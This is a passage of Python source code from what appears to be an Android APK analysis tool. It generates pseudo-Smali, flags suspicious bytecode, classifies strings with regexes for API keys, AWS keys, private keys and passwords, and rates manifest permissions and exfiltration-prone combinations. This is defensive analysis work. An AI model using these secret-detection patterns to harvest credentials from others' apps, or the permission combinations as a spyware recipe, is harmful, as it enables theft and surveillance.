        logger.warning(f"Failed to extract smali: {e}")
    
    return None


def _generate_pseudo_smali(java_source: str, class_name: str) -> str:
    """Generate pseudo-Smali representation from Java source for visualization."""
    lines = []
    lines.append(f".class public L{class_name};")
    lines.append(".super Ljava/lang/Object;")
    lines.append("")
    
    # Extract fields
    field_pattern = r'(?:public|private|protected)\s+(?:static\s+)?(?:final\s+)?([\w<>\[\]]+)\s+(\w+)\s*[;=]'
    for match in re.finditer(field_pattern, java_source):
        java_type, field_name = match.groups()
        smali_type = _java_type_to_smali(java_type)
        lines.append(f".field private {field_name}:{smali_type}")
    
    lines.append("")
    
    # Extract methods
    method_pattern = r'(?:public|private|protected)\s+(?:static\s+)?(?:final\s+)?(?:synchronized\s+)?([\w<>\[\]]+)\s+(\w+)\s*\(([^)]*)\)'
    for match in re.finditer(method_pattern, java_source):
        return_type, method_name, params = match.groups()
        smali_return = _java_type_to_smali(return_type)
        smali_params = _parse_java_params_to_smali(params)
        
        lines.append(f".method public {method_name}({smali_params}){smali_return}")
        lines.append("    .registers 5")
        lines.append("")
        lines.append("    # Pseudo-bytecode (actual bytecode requires APK)")
        lines.append("    return-void")
        lines.append(".end method")
        lines.append("")
    
    return '\n'.join(lines)


def _java_type_to_smali(java_type: str) -> str:
    """Convert Java type to Smali type descriptor."""
    type_map = {
        'void': 'V',
        'boolean': 'Z',
        'byte': 'B',
        'char': 'C',
        'short': 'S',
        'int': 'I',
        'long': 'J',
        'float': 'F',
        'double': 'D',
        'String': 'Ljava/lang/String;',
        'Object': 'Ljava/lang/Object;',
    }
    
    if java_type in type_map:
        return type_map[java_type]
    
    if java_type.endswith('[]'):
        return '[' + _java_type_to_smali(java_type[:-2])
    
    # Assume it's a class
    return f'L{java_type.replace(".", "/")};'


def _parse_java_params_to_smali(params: str) -> str:
    """Convert Java method parameters to Smali format."""
    if not params.strip():
        return ""
    
    result = []
    for param in params.split(','):
        param = param.strip()
        if not param:
            continue
        parts = param.split()
        if parts:
            java_type = parts[0]
            result.append(_java_type_to_smali(java_type))
    
    return ''.join(result)


def _analyze_smali_bytecode(smali_code: str) -> Dict[str, Any]:
    """Analyze Smali bytecode for interesting patterns."""
    stats = {
        "invocations": {
            "virtual": smali_code.count("invoke-virtual"),
            "static": smali_code.count("invoke-static"),
            "direct": smali_code.count("invoke-direct"),
            "interface": smali_code.count("invoke-interface"),
            "super": smali_code.count("invoke-super"),
        },
        "field_ops": {
            "iget": smali_code.count("iget"),
            "iput": smali_code.count("iput"),
            "sget": smali_code.count("sget"),
            "sput": smali_code.count("sput"),
        },
        "control_flow": {
            "if_statements": len(re.findall(r'if-\w+', smali_code)),
            "goto": smali_code.count("goto"),
            "switch": smali_code.count("packed-switch") + smali_code.count("sparse-switch"),
            "try_catch": smali_code.count(".catch"),
        },
        "suspicious_ops": {
            "reflection": smali_code.count("Ljava/lang/reflect/"),
            "runtime_exec": smali_code.count("Ljava/lang/Runtime;->exec"),
            "class_loader": smali_code.count("ClassLoader"),
            "dex_load": smali_code.count("DexClassLoader") + smali_code.count("PathClassLoader"),
            "native_calls": smali_code.count(".native"),
            "crypto": smali_code.count("Ljavax/crypto/"),
        },
    }
    return stats


def _count_registers(smali_code: str) -> int:
    """Count total registers used in Smali code."""
    matches = re.findall(r'\.registers\s+(\d+)', smali_code)
    return sum(int(m) for m in matches)


def _extract_smali_instructions(smali_code: str) -> List[Dict[str, Any]]:
    """Extract notable Smali instructions for display."""
    instructions = []
    
    # Find method boundaries
    method_pattern = r'\.method\s+([^\n]+)\n(.*?)\.end method'
    for match in re.finditer(method_pattern, smali_code, re.DOTALL):
        method_sig = match.group(1)
        method_body = match.group(2)
        
        # Extract interesting instructions
        for line_num, line in enumerate(method_body.split('\n')):
            line = line.strip()
            if not line or line.startswith('#') or line.startswith('.'):
                continue
            
            # Categorize instruction
            category = None
            if line.startswith('invoke-'):
                category = "invocation"
            elif line.startswith('const-string'):
                category = "string"
            elif line.startswith(('iget', 'iput', 'sget', 'sput')):
                category = "field"
            elif line.startswith('if-'):
                category = "branch"
            elif line.startswith('new-'):
                category = "allocation"
            
            if category:
                instructions.append({
                    "method": method_sig.split('(')[0].strip(),
                    "instruction": line[:100],
                    "category": category,
                })
        
        if len(instructions) > 100:  # Limit
            break
    
    return instructions[:100]


# ============================================================================
# String Extraction Functions
# ============================================================================

# String categories and patterns for classification
STRING_PATTERNS = {
    "url": (re.compile(r'https?://[^\s"\'<>]+', re.IGNORECASE), "high"),
    "ip_address": (re.compile(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b'), "medium"),
    "email": (re.compile(r'[\w.+-]+@[\w-]+\.[\w.-]+'), "medium"),
    "api_key": (re.compile(r'(?:api[_-]?key|apikey|api_secret|api_token)["\']?\s*[:=]\s*["\']?[\w-]{20,}', re.IGNORECASE), "critical"),
    "aws_key": (re.compile(r'AKIA[0-9A-Z]{16}'), "critical"),
    "private_key": (re.compile(r'-----BEGIN\s+(?:RSA\s+)?PRIVATE\s+KEY-----'), "critical"),
    "jwt": (re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'), "high"),
    "base64_secret": (re.compile(r'[A-Za-z0-9+/]{40,}={0,2}'), "low"),
    "password_field": (re.compile(r'(?:password|passwd|pwd|secret)["\']?\s*[:=]\s*["\'][^"\']+["\']', re.IGNORECASE), "critical"),
    "firebase": (re.compile(r'[a-z0-9-]+\.firebaseio\.com', re.IGNORECASE), "high"),
    "firebase_key": (re.compile(r'AIza[0-9A-Za-z_-]{35}'), "critical"),
    "sql_query": (re.compile(r'(?:SELECT|INSERT|UPDATE|DELETE)\s+.{10,}(?:FROM|INTO|SET)\s+', re.IGNORECASE), "medium"),
    "file_path": (re.compile(r'/(?:data|sdcard|storage|system)/[\w/.-]+'), "low"),
    "package_name": (re.compile(r'com\.[a-z][a-z0-9_]*(?:\.[a-z][a-z0-9_]*)+', re.IGNORECASE), "low"),
    "content_uri": (re.compile(r'content://[\w./]+'), "medium"),
    "intent_action": (re.compile(r'android\.intent\.action\.\w+'), "low"),
    "permission": (re.compile(r'android\.permission\.\w+'), "medium"),
    "phone_number": (re.compile(r'(?:\+\d{1,3})?[-.\s]?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}'), "low"),
    "crypto_algo": (re.compile(r'(?:AES|DES|RSA|MD5|SHA\d*|HMAC)', re.IGNORECASE), "medium"),
    "hardcoded_iv": (re.compile(r'(?:iv|IV|nonce)["\']?\s*[:=]\s*["\'][A-Za-z0-9+/=]{8,}["\']'), "high"),
}


def extract_all_strings(output_dir: Path, filters: Optional[List[str]] = None) -> Dict[str, Any]:
    """
    Extract all strings from decompiled sources with classification.
    
    Args:
        output_dir: JADX output directory
        filters: Optional list of categories to filter (url, api_key, etc.)
    
    Returns:
        Dictionary with categorized strings and statistics
    """
    sources_dir = output_dir / "sources"
    if not sources_dir.exists():
        return {"error": "Decompiled sources not found", "strings": [], "stats": {}}
    
    all_strings = []
    stats = {cat: 0 for cat in STRING_PATTERNS.keys()}
    stats["uncategorized"] = 0
    files_scanned = 0
    
    # Also check resources
    resources_dir = output_dir / "resources"
    
    for java_file in sources_dir.rglob("*.java"):
        try:
            content = java_file.read_text(encoding='utf-8', errors='ignore')
            rel_path = str(java_file.relative_to(sources_dir))
            files_scanned += 1
            
            # Extract string literals
            string_literals = re.findall(r'"([^"\\]*(\\.[^"\\]*)*)"', content)
            
            for match in string_literals:
                string_val = match[0] if isinstance(match, tuple) else match
                if len(string_val) < 3:  # Skip very short strings
                    continue
                
                # Classify string
                categories = []
                severity = "low"
                
                for cat_name, (pattern, cat_severity) in STRING_PATTERNS.items():
                    if pattern.search(string_val):
                        categories.append(cat_name)
                        stats[cat_name] += 1
                        if cat_severity == "critical":
                            severity = "critical"
                        elif cat_severity == "high" and severity not in ["critical"]:
                            severity = "high"
                        elif cat_severity == "medium" and severity not in ["critical", "high"]:
                            severity = "medium"
                
                if not categories:
                    categories = ["uncategorized"]
                    stats["uncategorized"] += 1
                
                # Apply filters
                if filters:
                    if not any(cat in filters for cat in categories):
                        continue
                
                # Find line number
                line_num = 1
                for i, line in enumerate(content.split('\n')):
                    if string_val in line:
                        line_num = i + 1
                        break
                
                all_strings.append({
                    "value": string_val[:500],  # Truncate long strings
                    "file": rel_path,
                    "line": line_num,
                    "categories": categories,
                    "severity": severity,
                    "length": len(string_val),
                })
        except Exception as e:
            logger.warning(f"Failed to extract strings from {java_file}: {e}")
    
    # Also extract from resources (strings.xml, etc.)
    if resources_dir.exists():
        for xml_file in resources_dir.rglob("*.xml"):
            try:
                content = xml_file.read_text(encoding='utf-8', errors='ignore')
                rel_path = str(xml_file.relative_to(resources_dir))
                
                # Find string values
                for match in re.finditer(r'>([^<]+)</', content):
                    string_val = match.group(1).strip()
                    if len(string_val) < 3:
                        continue
                    
                    categories = []
                    severity = "low"
                    
                    for cat_name, (pattern, cat_severity) in STRING_PATTERNS.items():
                        if pattern.search(string_val):
                            categories.append(cat_name)
                            stats[cat_name] += 1
                            if cat_severity == "critical":
                                severity = "critical"
                            elif cat_severity == "high" and severity != "critical":
                                severity = "high"
                    
                    if not categories:
                        continue  # Skip uncategorized XML strings
                    
                    if filters and not any(cat in filters for cat in categories):
                        continue
                    
                    all_strings.append({
                        "value": string_val[:500],
                        "file": f"resources/{rel_path}",
                        "line": 0,
                        "categories": categories,
                        "severity": severity,
                        "length": len(string_val),
                        "is_resource": True,
                    })
            except Exception as e:
                pass
    
    # Sort by severity
    severity_order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
    all_strings.sort(key=lambda x: (severity_order.get(x["severity"], 4), -x["length"]))
    
    return {
        "total_strings": len(all_strings),
        "files_scanned": files_scanned,
        "strings": all_strings[:1000],  # Limit to 1000
        "stats": stats,
        "severity_counts": {
            "critical": sum(1 for s in all_strings if s["severity"] == "critical"),
            "high": sum(1 for s in all_strings if s["severity"] == "high"),
            "medium": sum(1 for s in all_strings if s["severity"] == "medium"),
            "low": sum(1 for s in all_strings if s["severity"] == "low"),
        },
        "top_categories": sorted(
            [(k, v) for k, v in stats.items() if v > 0],
            key=lambda x: -x[1]
        )[:10],
    }


# ============================================================================
# Cross-Reference (XREF) Functions
# ============================================================================

def build_cross_references(output_dir: Path, class_path: str) -> Dict[str, Any]:
    """
    Build cross-references for a specific class.
    
    Returns:
    - Methods defined in this class
    - What calls each method (callers/incoming refs)
    - What each method calls (callees/outgoing refs)
    - Field references
    """
    sources_dir = output_dir / "sources"
    if not sources_dir.exists():
        return {"error": "Decompiled sources not found"}
    
    # Get the target class source
    target_source = get_jadx_class_source(output_dir, class_path)
    if not target_source:
        return {"error": f"Class not found: {class_path}"}
    
    # Parse target class info
    target_class_info = _parse_java_class(target_source, class_path)
    target_class_name = target_class_info.class_name
    target_package = target_class_info.package_name
    target_fqn = f"{target_package}.{target_class_name}" if target_package else target_class_name
    
    # Extract methods from target class with signatures
    method_pattern = r'(?:public|private|protected)?\s*(?:static\s+)?(?:final\s+)?(?:synchronized\s+)?([\w<>\[\],\s]+)\s+(\w+)\s*\(([^)]*)\)'
    target_methods = []
    for match in re.finditer(method_pattern, target_source):
        return_type, method_name, params = match.groups()
        target_methods.append({
            "name": method_name,
            "return_type": return_type.strip(),
            "params": params.strip(),
            "signature": f"{method_name}({params})",
            "callers": [],
            "callees": [],
            "line": _find_line_number(target_source, match.group(0)),
        })
    
    # Extract fields from target class
    field_pattern = r'(?:public|private|protected)\s+(?:static\s+)?(?:final\s+)?([\w<>\[\],\s]+)\s+(\w+)\s*[;=]'
    target_fields = []
    for match in re.finditer(field_pattern, target_source):
        field_type, field_name = match.groups()
        target_fields.append({
            "name": field_name,
            "type": field_type.strip(),
            "readers": [],
            "writers": [],
            "line": _find_line_number(target_source, match.group(0)),
        })
    
    # Find what target methods call (outgoing references)
    for method in target_methods:
        # Extract method body
        method_body = _extract_method_body(target_source, method["name"])
        if method_body:
            # Find method calls in body
            call_pattern = r'(?:(\w+)\.)?(\w+)\s*\('
            for call_match in re.finditer(call_pattern, method_body):
                obj_name, called_method = call_match.groups()
                if called_method not in ['if', 'for', 'while', 'switch', 'catch', 'synchronized']:
                    method["callees"].append({
                        "method": called_method,
                        "object": obj_name or "this",
                        "line": _find_line_number(method_body, call_match.group(0)),
                    })
    
    # Scan all other classes for references to this class
    callers_map = {m["name"]: [] for m in target_methods}
    field_readers_map = {f["name"]: [] for f in target_fields}
    field_writers_map = {f["name"]: [] for f in target_fields}
    
    for java_file in sources_dir.rglob("*.java"):
        if str(java_file).endswith(class_path):
            continue  # Skip self
        
        try:
            source = java_file.read_text(encoding='utf-8', errors='ignore')
            rel_path = str(java_file.relative_to(sources_dir))
            other_class = Path(rel_path).stem
            
            # Check for imports of target class
            imports_target = target_fqn in source or f"import {target_fqn}" in source
            uses_simple_name = target_class_name in source
            
            if not (imports_target or uses_simple_name):
                continue
            
            # Find method calls to target class
            for method in target_methods:
                # Look for TargetClass.method() or instance.method() patterns
                patterns = [
                    f'{target_class_name}.{method["name"]}\\s*\\(',
                    f'\\.{method["name"]}\\s*\\(',  # Any call to this method name
                ]
                
                for pattern in patterns:
                    for match in re.finditer(pattern, source):
                        line_num = _find_line_number(source, match.group(0))
                        caller_method = _find_enclosing_method(source, match.start())
                        
                        callers_map[method["name"]].append({
                            "class": other_class,
                            "file": rel_path,
                            "method": caller_method,
                            "line": line_num,
                        })
            
            # Find field accesses
            for field in target_fields:
                # Reader pattern: target.field or TargetClass.field
                reader_pattern = f'(?:{target_class_name}|\\w+)\\.{field["name"]}(?!\\s*=)'
                for match in re.finditer(reader_pattern, source):
                    line_num = _find_line_number(source, match.group(0))
                    field_readers_map[field["name"]].append({
                        "class": other_class,
                        "file": rel_path,
                        "line": line_num,
                    })
                
                # Writer pattern: target.field = 
                writer_pattern = f'(?:{target_class_name}|\\w+)\\.{field["name"]}\\s*='
                for match in re.finditer(writer_pattern, source):
                    line_num = _find_line_number(source, match.group(0))
                    field_writers_map[field["name"]].append({
                        "class": other_class,
                        "file": rel_path,
                        "line": line_num,
                    })
                    
        except Exception as e:
            logger.debug(f"Error scanning {java_file}: {e}")
    
    # Update methods with callers
    for method in target_methods:
        method["callers"] = callers_map.get(method["name"], [])[:50]  # Limit
        method["caller_count"] = len(callers_map.get(method["name"], []))
        method["callee_count"] = len(method["callees"])
    
    # Update fields with references
    for field in target_fields:
        field["readers"] = field_readers_map.get(field["name"], [])[:30]
        field["writers"] = field_writers_map.get(field["name"], [])[:30]
        field["read_count"] = len(field_readers_map.get(field["name"], []))
        field["write_count"] = len(field_writers_map.get(field["name"], []))
    
    # Calculate statistics
    total_incoming = sum(m["caller_count"] for m in target_methods)
    total_outgoing = sum(m["callee_count"] for m in target_methods)
    
    return {
        "class_name": target_class_name,
        "package": target_package,
        "file_path": class_path,
        "methods": target_methods,
        "fields": target_fields,
        "statistics": {
            "method_count": len(target_methods),
            "field_count": len(target_fields),
            "total_incoming_refs": total_incoming,
            "total_outgoing_refs": total_outgoing,
            "is_heavily_used": total_incoming > 10,
            "is_hub_class": total_outgoing > 20,
        },
        "summary": _generate_xref_summary(target_class_name, target_methods, target_fields, total_incoming, total_outgoing),
    }


def _find_line_number(source: str, target: str) -> int:
    """Find the line number of a target string in source."""
    pos = source.find(target)
    if pos == -1:
        return 0
    return source[:pos].count('\n') + 1


def _extract_method_body(source: str, method_name: str) -> Optional[str]:
    """Extract the body of a method from source code."""
    # Find method start
    pattern = rf'(?:public|private|protected)?\s*(?:static\s+)?[\w<>\[\],\s]+\s+{method_name}\s*\([^)]*\)\s*(?:throws\s+[\w,\s]+)?\s*\{{'
    match = re.search(pattern, source)
    if not match:
        return None
    
    start = match.end()
    brace_count = 1
    end = start
    
    while end < len(source) and brace_count > 0:
        if source[end] == '{':
            brace_count += 1
        elif source[end] == '}':
            brace_count -= 1
        end += 1
    
    return source[start:end-1]


def _find_enclosing_method(source: str, position: int) -> str:
    """Find the method name that contains a given position."""
    # Look backwards for method declaration
    search_area = source[:position]
    method_pattern = r'(?:public|private|protected)?\s*(?:static\s+)?[\w<>\[\],\s]+\s+(\w+)\s*\([^)]*\)\s*(?:throws\s+[\w,\s]+)?\s*\{'
    
    matches = list(re.finditer(method_pattern, search_area))
    if matches:
        return matches[-1].group(1)
    return "unknown"


def _generate_xref_summary(class_name: str, methods: List, fields: List, incoming: int, outgoing: int) -> str:
    """Generate a summary of cross-references."""
    parts = [f"Class {class_name}:"]
    
    # Most called methods
    most_called = sorted(methods, key=lambda m: m.get("caller_count", 0), reverse=True)[:3]
    if most_called and most_called[0].get("caller_count", 0) > 0:
        parts.append(f"Most called methods: {', '.join(m['name'] for m in most_called)}")
    
    # Hub methods (lots of outgoing calls)
    hub_methods = [m for m in methods if m.get("callee_count", 0) > 5]
    if hub_methods:
        parts.append(f"Hub methods (many calls): {', '.join(m['name'] for m in hub_methods[:3])}")
    
    # Heavily accessed fields
    hot_fields = [f for f in fields if f.get("read_count", 0) + f.get("write_count", 0) > 5]
    if hot_fields:
        parts.append(f"Frequently accessed fields: {', '.join(f['name'] for f in hot_fields[:3])}")
    
    if incoming > 10:
        parts.append(f" This is a heavily-used class ({incoming} incoming references)")
    
    if outgoing > 20:
        parts.append(f" This is a hub class ({outgoing} outgoing calls)")
    
    return " | ".join(parts)


# ============================================================================
# Feature: Download Project as ZIP
# ============================================================================

def create_project_zip(output_dir: Path) -> Path:
    """
    Create a ZIP file of the entire decompiled project.
    
    Args:
        output_dir: JADX output directory
    
    Returns:
        Path to the created ZIP file
    """
    import zipfile
    import shutil
    
    output_dir = Path(output_dir)
    if not output_dir.exists():
        raise ValueError(f"Output directory not found: {output_dir}")
    
    # Create zip filename based on directory name
    zip_name = f"{output_dir.name}_decompiled.zip"
    zip_path = output_dir.parent / zip_name
    
    # Remove existing zip if present
    if zip_path.exists():
        zip_path.unlink()
    
    # Create the ZIP file
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(output_dir):
            # Skip .git and __pycache__ directories
            dirs[:] = [d for d in dirs if d not in ['.git', '__pycache__', '.gradle']]
            
            for file in files:
                file_path = Path(root) / file
                arcname = file_path.relative_to(output_dir)
                
                # Skip very large files (>10MB)
                if file_path.stat().st_size > 10 * 1024 * 1024:
                    continue
                
                zipf.write(file_path, arcname)
    
    return zip_path


def get_project_zip_info(output_dir: Path) -> Dict[str, Any]:
    """
    Get information about what would be in the project ZIP.
    
    Args:
        output_dir: JADX output directory
    
    Returns:
        Dictionary with file counts and sizes
    """
    output_dir = Path(output_dir)
    if not output_dir.exists():
        return {"error": "Output directory not found"}
    
    total_files = 0
    total_size = 0
    file_types = {}
    
    for root, dirs, files in os.walk(output_dir):
        dirs[:] = [d for d in dirs if d not in ['.git', '__pycache__', '.gradle']]
        
        for file in files:
            file_path = Path(root) / file
            file_size = file_path.stat().st_size
            
            if file_size > 10 * 1024 * 1024:  # Skip >10MB
                continue
            
            total_files += 1
            total_size += file_size
            
            ext = file_path.suffix.lower() or '.noext'
            file_types[ext] = file_types.get(ext, 0) + 1
    
    return {
        "total_files": total_files,
        "total_size_bytes": total_size,
        "total_size_mb": round(total_size / (1024 * 1024), 2),
        "file_types": file_types,
        "estimated_zip_size_mb": round(total_size * 0.3 / (1024 * 1024), 2)  # Rough compression estimate
    }


# ============================================================================
# Feature: Permission Analyzer
# ============================================================================

# Android permission danger levels and descriptions
ANDROID_PERMISSIONS = {
    # Dangerous permissions - require explicit user approval
    "android.permission.READ_CALENDAR": {"level": "dangerous", "description": "Read calendar events", "category": "calendar"},
    "android.permission.WRITE_CALENDAR": {"level": "dangerous", "description": "Modify calendar events", "category": "calendar"},
    "android.permission.CAMERA": {"level": "dangerous", "description": "Access camera", "category": "camera"},
    "android.permission.READ_CONTACTS": {"level": "dangerous", "description": "Read contacts", "category": "contacts"},
    "android.permission.WRITE_CONTACTS": {"level": "dangerous", "description": "Modify contacts", "category": "contacts"},
    "android.permission.GET_ACCOUNTS": {"level": "dangerous", "description": "Get device accounts", "category": "contacts"},
    "android.permission.ACCESS_FINE_LOCATION": {"level": "dangerous", "description": "Precise GPS location", "category": "location"},
    "android.permission.ACCESS_COARSE_LOCATION": {"level": "dangerous", "description": "Approximate location", "category": "location"},
    "android.permission.ACCESS_BACKGROUND_LOCATION": {"level": "dangerous", "description": "Background location access", "category": "location"},
    "android.permission.RECORD_AUDIO": {"level": "dangerous", "description": "Record audio/microphone", "category": "microphone"},
    "android.permission.READ_PHONE_STATE": {"level": "dangerous", "description": "Read phone state/identity", "category": "phone"},
    "android.permission.READ_PHONE_NUMBERS": {"level": "dangerous", "description": "Read phone numbers", "category": "phone"},
    "android.permission.CALL_PHONE": {"level": "dangerous", "description": "Make phone calls", "category": "phone"},
    "android.permission.ANSWER_PHONE_CALLS": {"level": "dangerous", "description": "Answer phone calls", "category": "phone"},
    "android.permission.READ_CALL_LOG": {"level": "dangerous", "description": "Read call history", "category": "phone"},
    "android.permission.WRITE_CALL_LOG": {"level": "dangerous", "description": "Modify call history", "category": "phone"},
    "android.permission.ADD_VOICEMAIL": {"level": "dangerous", "description": "Add voicemail", "category": "phone"},
    "android.permission.USE_SIP": {"level": "dangerous", "description": "Use SIP calls", "category": "phone"},
    "android.permission.PROCESS_OUTGOING_CALLS": {"level": "dangerous", "description": "Process outgoing calls", "category": "phone"},
    "android.permission.BODY_SENSORS": {"level": "dangerous", "description": "Access body sensors", "category": "sensors"},
    "android.permission.ACTIVITY_RECOGNITION": {"level": "dangerous", "description": "Recognize physical activity", "category": "sensors"},
    "android.permission.SEND_SMS": {"level": "dangerous", "description": "Send SMS messages", "category": "sms"},
    "android.permission.RECEIVE_SMS": {"level": "dangerous", "description": "Receive SMS messages", "category": "sms"},
    "android.permission.READ_SMS": {"level": "dangerous", "description": "Read SMS messages", "category": "sms"},
    "android.permission.RECEIVE_WAP_PUSH": {"level": "dangerous", "description": "Receive WAP messages", "category": "sms"},
    "android.permission.RECEIVE_MMS": {"level": "dangerous", "description": "Receive MMS messages", "category": "sms"},
    "android.permission.READ_EXTERNAL_STORAGE": {"level": "dangerous", "description": "Read external storage", "category": "storage"},
    "android.permission.WRITE_EXTERNAL_STORAGE": {"level": "dangerous", "description": "Write to external storage", "category": "storage"},
    "android.permission.READ_MEDIA_IMAGES": {"level": "dangerous", "description": "Read images", "category": "storage"},
    "android.permission.READ_MEDIA_VIDEO": {"level": "dangerous", "description": "Read videos", "category": "storage"},
    "android.permission.READ_MEDIA_AUDIO": {"level": "dangerous", "description": "Read audio files", "category": "storage"},
    
    # Signature/System permissions - very high risk
    "android.permission.INSTALL_PACKAGES": {"level": "signature", "description": "Install apps silently", "category": "system"},
    "android.permission.DELETE_PACKAGES": {"level": "signature", "description": "Delete apps", "category": "system"},
    "android.permission.MOUNT_UNMOUNT_FILESYSTEMS": {"level": "signature", "description": "Mount filesystems", "category": "system"},
    "android.permission.CHANGE_COMPONENT_ENABLED_STATE": {"level": "signature", "description": "Enable/disable components", "category": "system"},
    "android.permission.REQUEST_INSTALL_PACKAGES": {"level": "dangerous", "description": "Request app installation", "category": "system"},
    
    # Network permissions - moderate risk
    "android.permission.INTERNET": {"level": "normal", "description": "Internet access", "category": "network"},
    "android.permission.ACCESS_NETWORK_STATE": {"level": "normal", "description": "View network state", "category": "network"},
    "android.permission.ACCESS_WIFI_STATE": {"level": "normal", "description": "View Wi-Fi state", "category": "network"},
    "android.permission.CHANGE_WIFI_STATE": {"level": "normal", "description": "Change Wi-Fi state", "category": "network"},
    "android.permission.CHANGE_NETWORK_STATE": {"level": "normal", "description": "Change network state", "category": "network"},
    "android.permission.BLUETOOTH": {"level": "normal", "description": "Bluetooth access", "category": "network"},
    "android.permission.BLUETOOTH_ADMIN": {"level": "normal", "description": "Bluetooth admin", "category": "network"},
    "android.permission.BLUETOOTH_CONNECT": {"level": "dangerous", "description": "Connect to Bluetooth devices", "category": "network"},
    "android.permission.BLUETOOTH_SCAN": {"level": "dangerous", "description": "Scan for Bluetooth devices", "category": "network"},
    "android.permission.NFC": {"level": "normal", "description": "NFC access", "category": "network"},
    
    # Other notable permissions
    "android.permission.VIBRATE": {"level": "normal", "description": "Vibrate device", "category": "hardware"},
    "android.permission.WAKE_LOCK": {"level": "normal", "description": "Keep device awake", "category": "hardware"},
    "android.permission.FLASHLIGHT": {"level": "normal", "description": "Use flashlight", "category": "hardware"},
    "android.permission.RECEIVE_BOOT_COMPLETED": {"level": "normal", "description": "Auto-start on boot", "category": "system"},
    "android.permission.FOREGROUND_SERVICE": {"level": "normal", "description": "Run foreground service", "category": "system"},
    "android.permission.SYSTEM_ALERT_WINDOW": {"level": "signature", "description": "Draw over other apps", "category": "system"},
    "android.permission.BIND_ACCESSIBILITY_SERVICE": {"level": "signature", "description": "Accessibility service (can monitor screen)", "category": "system"},
    "android.permission.BIND_DEVICE_ADMIN": {"level": "signature", "description": "Device administrator", "category": "system"},
    "android.permission.BIND_NOTIFICATION_LISTENER_SERVICE": {"level": "signature", "description": "Read all notifications", "category": "system"},
    "android.permission.PACKAGE_USAGE_STATS": {"level": "signature", "description": "Track app usage", "category": "system"},
    "android.permission.QUERY_ALL_PACKAGES": {"level": "normal", "description": "See all installed apps", "category": "system"},
    "android.permission.REQUEST_DELETE_PACKAGES": {"level": "normal", "description": "Request app deletion", "category": "system"},
    "android.permission.GET_TASKS": {"level": "deprecated", "description": "Get running tasks (deprecated)", "category": "system"},
    "android.permission.REORDER_TASKS": {"level": "normal", "description": "Reorder tasks", "category": "system"},
    "android.permission.DISABLE_KEYGUARD": {"level": "normal", "description": "Disable lock screen", "category": "system"},
    "android.permission.USE_BIOMETRIC": {"level": "normal", "description": "Use biometric authentication", "category": "hardware"},
    "android.permission.USE_FINGERPRINT": {"level": "normal", "description": "Use fingerprint sensor", "category": "hardware"},
}

# Security concerns for specific permission combinations
PERMISSION_COMBINATIONS = [
    {
        "permissions": ["android.permission.INTERNET", "android.permission.READ_CONTACTS"],
        "risk": "high",
        "description": "Can exfiltrate contacts over network"
    },
    {
        "permissions": ["android.permission.INTERNET", "android.permission.READ_SMS"],
        "risk": "critical",
        "description": "Can exfiltrate SMS messages (2FA codes!)"
    },
    {
        "permissions": ["android.permission.INTERNET", "android.permission.ACCESS_FINE_LOCATION"],
        "risk": "high",
        "description": "Can track and transmit precise location"
    },
    {
        "permissions": ["android.permission.INTERNET", "android.permission.CAMERA"],
        "risk": "high",
        "description": "Can capture and transmit photos"
    },
    {
        "permissions": ["android.permission.INTERNET", "android.permission.RECORD_AUDIO"],
        "risk": "high",
        "description": "Can record and transmit audio"
    },
    {
        "permissions": ["android.permission.READ_EXTERNAL_STORAGE", "android.permission.INTERNET"],
        "risk": "high",
        "description": "Can exfiltrate files over network"
    },
    {
        "permissions": ["android.permission.RECEIVE_BOOT_COMPLETED", "android.permission.INTERNET"],
        "risk": "medium",
        "description": "Auto-starts and connects to network (potential C&C)"
    },
    {
        "permissions": ["android.permission.SYSTEM_ALERT_WINDOW", "android.permission.RECORD_AUDIO"],
        "risk": "critical",
        "description": "Can overlay screens and record (phishing/spyware)"
    },
    {
        "permissions": ["android.permission.BIND_ACCESSIBILITY_SERVICE"],
        "risk": "critical",
        "description": "Full screen monitoring - can capture passwords"
    },
    {
        "permissions": ["android.permission.BIND_NOTIFICATION_LISTENER_SERVICE", "android.permission.INTERNET"],
        "risk": "critical",
        "description": "Can read and exfiltrate all notifications (including 2FA)"
    },
    {
        "permissions": ["android.permission.REQUEST_INSTALL_PACKAGES", "android.permission.INTERNET"],
        "risk": "high",
        "description": "Can download and install additional malware"
    },
]


def analyze_permissions(output_dir: Path) -> Dict[str, Any]:
    """
    Analyze permissions from AndroidManifest.xml.
    
    Args:
        output_dir: JADX output directory
    
    Returns:
        Dictionary with permission analysis results
    """
    from defusedxml import ElementTree as ET  # Use defusedxml to prevent XXE attacks
    
    output_dir = Path(output_dir)
    manifest_path = output_dir / "resources" / "AndroidManifest.xml"
    
    # Also check root for manifest
    if not manifest_path.exists():
        manifest_path = output_dir / "AndroidManifest.xml"
    
    if not manifest_path.exists():
        return {"error": "AndroidManifest.xml not found"}
    
    try:
        tree = ET.parse(manifest_path)
        root = tree.getroot()
    except ET.ParseError as e:
        return {"error": f"Failed to parse manifest: {str(e)}"}
    
    # Extract namespace
    ns = {'android': 'http://schemas.android.com/apk/res/android'}
    
    # Find all uses-permission elements
    permissions = []
    permission_names = set()
    
    for elem in root.iter():
        if elem.tag == 'uses-permission' or elem.tag.endswith('}uses-permission'):
            perm_name = elem.get('{http://schemas.android.com/apk/res/android}name') or elem.get('android:name') or elem.get('name')
            if perm_name:
                permission_names.add(perm_name)
                
                # Look up permission info
                perm_info = ANDROID_PERMISSIONS.get(perm_name, {
                    "level": "unknown",
                    "description": "Unknown permission",
                    "category": "unknown"
                })
                
                permissions.append({
                    "name": perm_name,
                    "short_name": perm_name.split('.')[-1] if '.' in perm_name else perm_name,
                    "level": perm_info["level"],
                    "description": perm_info["description"],
                    "category": perm_info["category"]
                })
    
    # Sort by danger level
    level_order = {"signature": 0, "dangerous": 1, "normal": 2, "deprecated": 3, "unknown": 4}
    permissions.sort(key=lambda p: level_order.get(p["level"], 5))
    
    # Categorize permissions
    by_level = {"signature": [], "dangerous": [], "normal": [], "deprecated": [], "unknown": []}
    by_category = {}
    
    for perm in permissions:
        level = perm["level"]
        if level in by_level:
            by_level[level].append(perm)
        
        cat = perm["category"]
        if cat not in by_category:
            by_category[cat] = []
        by_category[cat].append(perm)
    
    # Check for dangerous combinations
    dangerous_combinations = []
    for combo in PERMISSION_COMBINATIONS:
